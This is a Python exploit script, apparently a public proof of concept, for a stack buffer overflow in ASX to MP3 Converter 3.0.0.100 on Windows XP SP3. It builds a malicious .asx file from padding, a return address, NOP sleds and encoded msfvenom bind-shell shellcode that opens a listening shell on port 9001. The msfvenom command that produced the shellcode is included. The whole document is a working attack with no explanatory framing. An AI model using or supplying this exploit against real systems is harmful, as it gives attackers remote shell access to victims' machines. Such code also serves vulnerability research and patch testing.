# Exploit for ASX to MP3 Converter Version 3.0.0.100 - Stack Buffer Overflow
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.asx", "wb")

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x1a" -f c

bind = ("\xdb\xc0\xd9\x74\x24\xf4\x5a\x33\xc9\xbe\x83\x26\x0e\xae\xb1"
"\x53\x31\x72\x17\x83\xc2\x04\x03\xf1\x35\xec\x5b\x09\xd1\x72"
"\xa3\xf1\x22\x13\x2d\x14\x13\x13\x49\x5d\x04\xa3\x19\x33\xa9"
"\x48\x4f\xa7\x3a\x3c\x58\xc8\x8b\x8b\xbe\xe7\x0c\xa7\x83\x66"
"\x8f\xba\xd7\x48\xae\x74\x2a\x89\xf7\x69\xc7\xdb\xa0\xe6\x7a"
"\xcb\xc5\xb3\x46\x60\x95\x52\xcf\x95\x6e\x54\xfe\x08\xe4\x0f"
"\x20\xab\x29\x24\x69\xb3\x2e\x01\x23\x48\x84\xfd\xb2\x98\xd4"
"\xfe\x19\xe5\xd8\x0c\x63\x22\xde\xee\x16\x5a\x1c\x92\x20\x99"
"\x5e\x48\xa4\x39\xf8\x1b\x1e\xe5\xf8\xc8\xf9\x6e\xf6\xa5\x8e"
"\x28\x1b\x3b\x42\x43\x27\xb0\x65\x83\xa1\x82\x41\x07\xe9\x51"
"\xeb\x1e\x57\x37\x14\x40\x38\xe8\xb0\x0b\xd5\xfd\xc8\x56\xb2"
"\x32\xe1\x68\x42\x5d\x72\x1b\x70\xc2\x28\xb3\x38\x8b\xf6\x44"
"\x3e\xa6\x4f\xda\xc1\x49\xb0\xf3\x05\x1d\xe0\x6b\xaf\x1e\x6b"
"\x6b\x50\xcb\x06\x63\xf7\xa4\x34\x8e\x47\x15\xf9\x20\x20\x7f"
"\xf6\x1f\x50\x80\xdc\x08\xf9\x7d\xdf\x15\xd3\x08\x39\x33\x33"
"\x5d\x91\xab\xf1\xba\x2a\x4c\x09\xe9\x02\xfa\x42\xfb\x95\x05"
"\x53\x29\xb2\x91\xd8\x3e\x06\x80\xde\x6a\x2e\xd5\x49\xe0\xbf"
"\x94\xe8\xf5\x95\x4e\x88\x64\x72\x8e\xc7\x94\x2d\xd9\x80\x6b"
"\x24\x8f\x3c\xd5\x9e\xad\xbc\x83\xd9\x75\x1b\x70\xe7\x74\xee"
"\xcc\xc3\x66\x36\xcc\x4f\xd2\xe6\x9b\x19\x8c\x40\x72\xe8\x66"
"\x1b\x29\xa2\xee\xda\x01\x75\x68\xe3\x4f\x03\x94\x52\x26\x52"
"\xab\x5b\xae\x52\xd4\x81\x4e\x9c\x0f\x02\x6e\x7f\x85\x7f\x07"
"\x26\x4c\xc2\x4a\xd9\xbb\x01\x73\x5a\x49\xfa\x80\x42\x38\xff"
"\xcd\xc4\xd1\x8d\x5e\xa1\xd5\x22\x5e\xe0")

nops = 24 * "\x90"

buffer = "A" * 224 + "\x9d\x78\x03\x10" + nops + bind + nops + "C"*(5000-4-224-len(bind)-len(2*nops))

file.write(buffer)
file.close()
